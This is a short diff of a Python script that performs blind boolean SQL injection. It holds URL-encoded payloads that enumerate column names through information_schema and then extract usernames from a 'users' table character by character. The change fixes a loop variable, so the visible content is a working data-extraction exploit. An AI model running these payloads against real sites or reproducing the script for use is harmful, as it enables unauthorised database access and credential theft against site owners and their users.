@@ -63,7 +63,7 @@ for table_no in range(db_table_count):
         field_name = guess_name("Field Name: ", "'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+1+offset+" + str(field_no) + "),", "+%23", field_name_len, ord(' '), ord('z'))
 column_field_count = guess_len("Column Field Count: ", "'+and+(select+count(user)+from+users)+=", "+%23")
 # column_field_count_pass = guess_len("Column Field Count Password: ", "'+and+(select+count(password)+from+users)+=", "+%23")
-for i in range(0,column_field_count_user):
+for i in range(0,column_field_count):
     len_each_record_user = guess_len("Length each Record User: ", "'+and+length(substr((select+user+from+users+limit+1+offset+" + str(i) + "),1))+=", "+%23")
     for a in range(1, len_each_record_user):
         record_name_user = guess_name("Record Name User: ", "'+and+ascii(substr((select+user+from+users+limit+1+offset+" + str(i) + "),", "+%23", len_each_record_user, ord(' '), ord('z'))
